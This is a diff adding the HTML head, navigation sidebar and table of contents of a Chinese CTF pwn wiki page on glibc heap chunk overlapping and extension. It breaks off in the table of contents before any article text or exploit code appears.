@@ -1,0 +1,2330 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>堆重叠&拓展 - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              堆重叠&拓展
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      IO_FILE
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="IO_FILE" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        IO_FILE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      libc2.24下IO_FILE的利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/Pwn_IO_FILE/" class="md-nav__link">
+      Pwn_IO_FILE
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" checked>
+    
+    <label class="md-nav__link" for="nav-1-2">
+      Heap
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Heap" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        <span class="md-nav__icon md-icon"></span>
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      堆基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../off_by_one/" class="md-nav__link">
+      off_by_one
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../fastbin/" class="md-nav__link">
+      fastbin attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        堆重叠&拓展
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      堆重叠&拓展
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-inuse-fastbin-extend" class="md-nav__link">
+    基本示例 1：对 inuse 的 fastbin 进行 extend
+  </a>
+  
+    <nav class="md-nav" aria-label="基本示例 1：对 inuse 的 fastbin 进行 extend">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    注解
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-inuse-smallbin-extend" class="md-nav__link">
+    基本示例 2：对 inuse 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-free-smallbin-extend" class="md-nav__link">
+    基本示例 3：对 free 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chunk-extendshrink" class="md-nav__link">
+    Chunk Extend/Shrink 可以做什么
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-extend-overlapping" class="md-nav__link">
+    基本示例 4：通过 extend 后向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-extend-overlapping" class="md-nav__link">
+    基本示例 5：通过 extend 前向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hitcon-trainging-lab13" class="md-nav__link">
+    HITCON Trainging lab13
+  </a>
+  
+    <nav class="md-nav" aria-label="HITCON Trainging lab13">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2015-hacklu-bookstore" class="md-nav__link">
+    2015 hacklu bookstore
+  </a>
+  
+    <nav class="md-nav" aria-label="2015 hacklu bookstore">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆溢出
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uaf" class="md-nav__link">
+    UAF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    格式化字符串
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    奇怪的输入长度
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    控制格式化字符串内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fini_array" class="md-nav__link">
+    劫持 fini_array
+  </a>
+  
+    <nav class="md-nav" aria-label="劫持 fini_array">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#way-1" class="md-nav__link">
+    Way 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#way-2" class="md-nav__link">
+    Way 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#main" class="md-nav__link">
+    修改 main 函数返回地址
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    补充总结
+  </a>
+  
+    <nav class="md-nav" aria-label="补充总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fini_array_1" class="md-nav__link">
+    怎么找 fini_array ？
+  </a>
+  
+    <nav class="md-nav" aria-label="怎么找 fini_array ？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位静态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64_1" class="md-nav__link">
+    64 位动态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    静态动态利用方式小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../use_after_free/" class="md-nav__link">
+      UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../unlink/" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../realloc/" class="md-nav__link">
+      realloc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../unsorted_bin_attack/" class="md-nav__link">
+      unsorted_bin_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../Libc2.29%E7%B1%BBunlink_attack/" class="md-nav__link">
+      libc2.29类unlink_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      沙盒堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2-11" type="checkbox" id="nav-1-2-11" >
+    
+    <label class="md-nav__link" for="nav-1-2-11">
+      House技术
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="House技术" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-11">
+        <span class="md-nav__icon md-icon"></span>
+        House技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../House/House_Of_Force/House_Of_Force/" class="md-nav__link">
+      House_Of_Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../House/House_of_Lore/House_of_Lore/" class="md-nav__link">
+      House_of_Lore
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" >
+    
+    <label class="md-nav__link" for="nav-1-3">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+    
+    <label class="md-nav__link" for="nav-2">
+      Stack
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Stack" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Stack
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      ROP
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="ROP" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        ROP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      蒸米ROP笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/SROP/srop/" class="md-nav__link">
+      SROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/Canary/" class="md-nav__link">
+      Canary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      栈迁移
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+      fini_array劫持
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" >
+    
+    <label class="md-nav__link" for="nav-3">
+      Misc
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Misc" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      文件的结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="md-nav__link">
+      ZIP压缩包伪加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/" class="md-nav__link">
+      内存取证-volatility
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/" class="md-nav__link">
+      CTF密码学中python库应用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      yafu安装及使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      RSA加密笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-inuse-fastbin-extend" class="md-nav__link">
+    基本示例 1：对 inuse 的 fastbin 进行 extend
+  </a>
+  
+    <nav class="md-nav" aria-label="基本示例 1：对 inuse 的 fastbin 进行 extend">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    注解
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-inuse-smallbin-extend" class="md-nav__link">
+    基本示例 2：对 inuse 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-free-smallbin-extend" class="md-nav__link">
+    基本示例 3：对 free 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chunk-extendshrink" class="md-nav__link">
+    Chunk Extend/Shrink 可以做什么
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-extend-overlapping" class="md-nav__link">
+    基本示例 4：通过 extend 后向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-extend-overlapping" class="md-nav__link">
+    基本示例 5：通过 extend 前向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hitcon-trainging-lab13" class="md-nav__link">
+    HITCON Trainging lab13
+  </a>
+  
+    <nav class="md-nav" aria-label="HITCON Trainging lab13">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    基本信息
